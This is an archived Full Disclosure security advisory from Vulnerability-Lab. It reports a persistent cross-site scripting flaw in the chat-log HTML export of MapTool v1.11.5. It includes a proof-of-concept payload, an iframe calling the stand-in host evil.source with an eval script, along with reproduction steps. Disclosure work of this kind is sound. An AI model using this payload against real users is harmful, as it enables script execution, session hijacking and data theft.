---
title: MapTool v1.11.5 - Cross Site Scripting Vulnerabilities
url: https://seclists.org/fulldisclosure/2022/Oct/20
source: Full Disclosure
date: 2022-10-22
fetch_date: 2025-10-03T20:39:40.746201
---

# MapTool v1.11.5 - Cross Site Scripting Vulnerabilities

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](19)
[By Date](date.html#20)
[![Next](/images/right-icon-16x16.png)](21)

[![Previous](/images/left-icon-16x16.png)](19)
[By Thread](index.html#20)
[![Next](/images/right-icon-16x16.png)](21)

![](/shared/images/nst-icons.svg#search)

# MapTool v1.11.5 - Cross Site Scripting Vulnerabilities

---

*From*: "info () vulnerability-lab com" <info () vulnerability-lab com>
*Date*: Mon, 17 Oct 2022 10:00:38 +0200

---

```
Document Title:
===============
MapTool v1.11.5 - Cross Site Scripting Vulnerabilities

References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2319

Release Date:
=============
2022-10-11

Vulnerability Laboratory ID (VL-ID):
====================================
2319

Common Vulnerability Scoring System:
====================================
5.6

Vulnerability Class:
====================
Cross Site Scripting - Persistent

Current Estimated Price:
========================
500€ - 1.000€

Product & Service Introduction:
===============================
MapTool is a fully featured, flexible virtual tabletop. Not only does MapTool come with powerful tools for creating
detailed maps
but also a chat function, an initiative tracker, and a detailed token management system to create characters, monsters,
objects,
and anything you can imagine. MapTool's user interface is highly configurable, and features not being used can be
hidden out of sight.
The latest version of MapTool can be found on GitHub. MapTool attempts to use Semantic Versioning to help groups know
whether a change
may break their game or not so they can decide when to upgrade. Exciting new features can be tested in development
(alpha or beta) builds,
but for your game where stability matters sticking to the major releases is recommended. MapTool campaigns saved in
newer versions may not
work on older versions, so be careful with your campaign files when trying out development builds.

(Copy of the Homepage:https://wiki.rptools.info/index.php/MapTool  )
(Download Software:https://www.rptools.net/toolbox/download-rptools-products  )

Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a persistent web vulnerability in the official MapTool
v1.11.5 software.

Affected Product(s):
====================
Rptools
Product: MapTool v1.11.5 - (Windows) (Linux) (MacOS)

Vulnerability Disclosure Timeline:
==================================
2022-06-03: Researcher Notification & Coordination (Security Researcher)
2022-06-04: Vendor Notification (Security Department)
2022-**-**: Vendor Response/Feedback (Security Department)
2022-**-**: Vendor Fix/Patch (Service Developer Team)
2022-**-**: Security Acknowledgements (Security Department)
2022-10-11: Public Disclosure (Vulnerability Laboratory)

Discovery Status:
=================
Published

Exploitation Technique:
=======================
Remote

Severity Level:
===============
Medium

Authentication Type:
====================
Restricted Authentication (Guest Privileges)

User Interaction:
=================
Low User Interaction

Disclosure Type:
================
Independent Security Research

Technical Details & Description:
================================
A persistent input validation web vulnerability has been discovered in the official MapTool v1.11.5 software.
The vulnerability allows remote attackers to inject own malicious script codes with persistent attack vector
to compromise browser to web-application requests from the application-side.

The vulnerability is located in the Speicher den Nachrichtenverlauf (Save Message Logs) function that exports
without a secure encode of html entities. Thus allows remote attackers to send malicious payloads that are not
visible in the chat but being saved to the exported html file. Opening the html file directly executes the injected
script code payloads on the local computer system. The vulnerability can be used by actors to form malicious files
for malware, phishing or data exfiltration after locat compromise.

Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent
external redirects to malicious source and persistent manipulation of affected application modules.

Vulnerable Module(s):
[+] Chat

Affected Module(s):
[+] Speicher den Nachrichtenverlauf

Proof of Concept (PoC):
=======================
The persistent and non-persistent input validation web vulnerabilities can be exploited by remote attackers without
user account and with or without low user interaction.
For security demonstration or to reproduce the persistent cross site web vulnerability follow the provided information
and steps below to continue.

PoC: Payload
<iframe src="http://evil.source/malicious.jsp?inject=<script>eval(name)</script>" name="alert(1337)"></iframe>

Manual steps to reproduce the vulnerability:
1. Install the linux, windows or macos map software
2. Open the chat and inject payload
3. Send the input to execute
4. Save the chat logs by settings (default html)
5. Open the exported html file with the chat communication
Note: Opening the file directly executes the payload
6. Successful reproduce of the non-persistent and persistent input validation vulnerability

PoC: Exploitation (test.html)
<table class="ava-msg">
<tbody><tr valign="top">
<td class="avatar">
</td>
<td class="message">
<span class="prefix">Anonymer Benutzer:</span> <span><font color="#000000">evil.source[MALICIOUS SCRIPT CODE EXECUTION
POINT]</font></span>
</td>
</tr>
</tbody></table>
</div>
<div>
"antlr.collections.AST.equalsTree(antlr.collections.AST)" because
"this.tree" is null Fehler beim Ausführen des Ausdrucks .
</div>
<div>
Fehlerspur: chat
</div>
<div>
"antlr.collections.AST.equalsTree(antlr.collections.AST)" because
"this.tree" is null Fehler beim Ausführen des Ausdrucks .
</div>

Security Risk:
==============
The security risk of the persistent script code injection vulnerability in the maptool software is estimated as medium.

Credits & Authors:
==================
Vulnerability-Lab [Research Team] -https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab

Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all
warranties,
either expressed or implied, including the warranties of merchantability and capability for a particular purpose.
Vulnerability-Lab
or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of
business profits
or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages.
Some states do
not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation
may not apply.
We do not approve or encourage anybody to break any licenses, policies, deface websites, hack into databases or trade
with stolen data.

Domains:        https://www.vulnerability-lab.com  ;    https://www.vuln-lab.com  ;https://www.vulnerability-db.com

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability
Laboratory.
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the
use of other
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, tex...